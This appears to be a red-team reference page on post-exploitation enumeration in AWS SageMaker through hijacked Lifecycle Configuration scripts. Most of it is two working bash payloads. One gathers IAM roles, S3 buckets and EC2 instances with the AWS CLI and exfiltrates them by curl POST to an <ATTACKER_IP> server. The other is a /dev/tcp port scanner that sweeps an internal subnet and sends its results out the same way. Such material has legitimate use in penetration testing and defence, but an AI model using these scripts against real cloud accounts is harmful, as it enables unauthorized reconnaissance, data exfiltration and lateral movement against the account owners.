# **AWS \- SageMaker Enumeration (Post-Exploitation)**

## **Enumeration via Lifecycle Configurations (LCCs)**

An attacker who has gained control over a SageMaker Lifecycle Configuration (LCC) can automate reconnaissance and enumeration of the AWS environment. The LCC script runs with the permissions of the instance's IAM role, allowing it to use tools like the AWS CLI or network scanners to gather information.

The output of these enumeration commands must be exfiltrated to be useful. This is typically done by piping the output to curl to POST it to an attacker-controlled server, or by writing the results to a file that is later exfiltrated (see the Post-Exploitation section for exfiltration techniques).

### **Cloud Infrastructure Enumeration**

An LCC can be used to run a sweep of discovery commands using the AWS CLI to understand what the compromised role has access to.

* Payload Example (AWS Resource Enumeration Script):  
  This script runs several aws commands to discover IAM roles, S3 buckets, and EC2 instances, then exfiltrates the collected data. The nohup command is used to ensure the script has time to complete.  

```bash
#!/bin/bash

# Attacker server for exfiltrating enumeration results
ATTACKER_SERVER="http://<ATTACKER_IP>:<PORT>/enum_results"

# Run enumeration in the background to avoid LCC timeout
nohup bash -c '

# Create a temporary file for results
RESULTS_FILE="/tmp/enum_data.txt"
echo "--- IAM Roles ---" > $RESULTS_FILE
aws iam list-roles --query "Roles[].Arn" >> $RESULTS_FILE 2>&1

echo "\n--- S3 Buckets ---" >> $RESULTS_FILE
aws s3 ls >> $RESULTS_FILE 2>&1

echo "\n--- EC2 Instances ---" >> $RESULTS_FILE
aws ec2 describe-instances --query "Reservations[].Instances[].InstanceId" >> $RESULTS_FILE 2>&1

# Exfiltrate the results
curl -s -X POST --data-binary @$RESULTS_FILE $ATTACKER_SERVER

# Clean up
rm -f $RESULTS_FILE

' &
```

### **Internal Network Reconnaissance**

If the SageMaker instance is deployed within a VPC, an LCC can be used to run a custom script to scan the internal network for other live hosts and open ports. This helps an attacker map the internal network for potential lateral movement targets without relying on pre-installed tools like nmap.

* Payload Example (Custom Bash Port Scanner):  
  This self-contained script iterates through a subnet and a list of common ports, using bash's built-in TCP functionality to check for open ports. The results are then exfiltrated.  


```bash
#!/bin/bash

# Attacker server and target network
ATTACKER_SERVER="http://<ATTACKER_IP>:<PORT>/scan_results"
TARGET_SUBNET_PREFIX="10.0.1" # Scans 10.0.1.1-254

# A list of common ports to check
PORTS_TO_SCAN="21 22 23 25 53 80 110 139 443 445 1433 1521 3306 3389 5432 5900 8080"

# Run the scanner in the background to avoid LCC timeout
nohup bash -c "

# Temporary file for results
RESULTS_FILE=\"/tmp/scan_results.txt\"

# Loop through hosts in the /24 subnet
for i in {1..254}; do
  IP=\"$TARGET_SUBNET_PREFIX.$i\"

  # Loop through ports
  for PORT in $PORTS_TO_SCAN; do
    # Check for open TCP port with a 1-second timeout
    (echo >/dev/tcp/\$IP/\$PORT) &>/dev/null && \
      echo \"[OPEN] \$IP:\$PORT\" >> \$RESULTS_FILE &
    sleep 0.01 # Small delay to avoid overwhelming the system
  done
done

# Wait for background jobs to finish
sleep 5

# Exfiltrate results if any were found
if [ -f \$RESULTS_FILE ]; then
  curl -s -X POST --data-binary @\$RESULTS_FILE \$ATTACKER_SERVER
  rm -f \$RESULTS_FILE
fi

" &
```
